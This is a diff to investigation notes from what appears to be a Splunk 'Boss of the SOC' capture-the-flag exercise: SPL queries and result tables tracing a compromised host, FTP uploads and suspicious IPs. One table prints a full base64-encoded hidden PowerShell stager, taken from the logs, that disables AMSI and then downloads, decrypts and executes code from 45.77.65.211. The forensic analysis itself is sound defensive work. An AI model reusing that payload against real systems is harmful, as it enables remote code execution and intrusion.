@@ -1,4 +1,9 @@
-## "frothly\\\billy.tun"
+## index="botsv*" "frothly\\\billy.tun"
+### index="botsv*" user="frothly\\billy.tun" 45.77.65.211 | stats count by src_ip,dest_ip
+| src_ip     | dest_ip     | count |
+|------------|-------------|-------|
+| 10.0.2.107 | 45.77.65.211 | 12487 |
+
 ### index="botsv*" "frothly\\\billy.tun" process_name="netsh.exe"
 ```sh
 08/23/2017 08:33:29 PM
@@ -37,7 +42,32 @@ Type 3 is a limited token with administrative privileges removed and administrat
 ```
 
 
-## ftp
+
+## index="botsv*" "10.0.2.107"
+### index="botsv*" "10.0.2.107" | stats count by src_ip,dest_ip
+
+### index="botsv*" 10.0.2.107 EventCode=4624 | stats count by Workstation_Name
+| Workstation_Name | count |
+|------------------|-------|
+| WRK-BTUN         | 515   |
+
+### index="botsv*" EventCode IN (4648,4688) AND WRK-BTUN AND powershell AND -enc | stats count by Creator_Process_ID
+| Creator_Process_ID | count |
+|--------------------|-------|
+| 0x1174             | 1     |
+| 0x8c0              | 1     |
+| 0xed8              | 1     |
+
+### index="botsv*" EventCode IN (4648,4688) AND WRK-BTUN AND parent_process_id IN (0xed8, 0x8c0, 0x1174) | stats count by process_command_line_process,process_command_line_arguments
+| process_command_line_process                                 | process_command_line_arguments                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | count |
+|--------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------|
+| C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe    | -NoP -NonI -W Hidden -enc WwBSAGUAZgBdAC4AQQBzAFMARQBtAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBMAFUARQAoACQAbgBVAEwAbAAsACQAVABSAHUARQApAH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAEUAUgB2AEkAQwBFAFAATwBJAG4AVABNAEEAbgBhAGcARQBSAF0AOgA6AEUAWABQAEUAYwB0ADEAMAAwAEMAbwBuAHQAaQBOAHUAZQA9ADAAOwAkAHcAQwA9AE4ARQBXAC0ATwBiAGoARQBDAHQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBFAGIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAdwBjAC4ASABlAEEAZABlAFIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAG8AeAB5AD0AWwBTAHkAUwBUAEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBFAFEAVQBlAFMAdABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBvAHgAWQA7ACQAVwBjAC4AUABSAE8AeAB5AC4AQwBSAGUARABlAE4AdABJAGEAbABTACAAPQAgAFsAUwB5AHMAdABlAE0ALgBOAEUAdAAuAEMAcgBFAGQARQBuAHQAaQBhAEwAQwBhAGCASABlAF0AOgA6AEQAZQBGAEEAdQBMAHQATgBlAHQAVwBPAFIAawBDAFIARQBEAGUATgB0AEkAQQBsAHMAOwAkAEsAPQBbAFMAeQBzAHQARQBtAC4AVABlAHgAdAAuAEUAbgBjAE8ARABJAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAHkAVABlAFMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAHgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGwAcgB0AFIASABLAGsAQQA2AEkATAA1AGgALwBkADgARQBrAGsANgBRAHMAeAB5AFAAdgBrAD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBhAGQAbQBpAG4ALwBnAGUAdAAuAHAAaABwACcAOwAkAEQAQQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4ATABvAGEARABEAEEAVABBACgAJABTAEUAUgArACQAVAApADsAJABpAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAYQBUAGEALgBsAEUATgBHAFQAaABdADsALQBKAG8ASQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA== | 1     |
+| C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe    | -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | 1     |
+| powershell                                                   | -noP -sta -w 1 -enc  WwBSAEUARgBdAC4AQQBTAFMARQBtAGIAbABZAC4ARwBlAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AH
+
+
+
+##  index="botsv*" sourcetype="stream:ftp"
 ### index="botsv*" sourcetype="stream:ftp" loadway=Upload "*.pdf" | stats count by src_ip,dest_ip
 | src_ip | dest_ip | count |
 | -      | -       | -     |
@@ -67,3 +97,20 @@ Type 3 is a limited token with administrative privileges removed and administrat
 | 10.0.2.109 | 160.153.91.7 | 나는_데이비드를_사랑한다.hwp                | 1      |
 
 
+
+## index="botsv*" "160.153.91.7"
+### index="botsv*" "160.153.91.7" | stats count by src_ip,dest_ip
+| src_ip       | dest_ip      | count |
+|--------------|--------------|-------|
+| 10.0.1.100   | 160.153.91.7 | 3     |
+| 10.0.1.100   | 8.8.8.8      | 9     |
+| 10.0.1.101   | 160.153.91.7 | 3     |
+| 10.0.1.101   | 4.4.4.4      | 1     |
+| 10.0.2.107   | 10.0.1.100   | 8     |
+| 10.0.2.107   | 160.153.91.7 | 1479  |
+| 10.0.2.109   | 10.0.1.100   | 4     |
+| 10.0.2.109   | 160.153.91.7 | 41    |
+| 71.39.18.125 | 160.153.91.7 | 2     |
+| 160.153.91.7 | 10.0.2.107   | 2144  |
+| 160.153.91.7 | 10.0.2.109   | 27    |
+| 160.153.91.7 | 71.39.18.125 | 1450  |
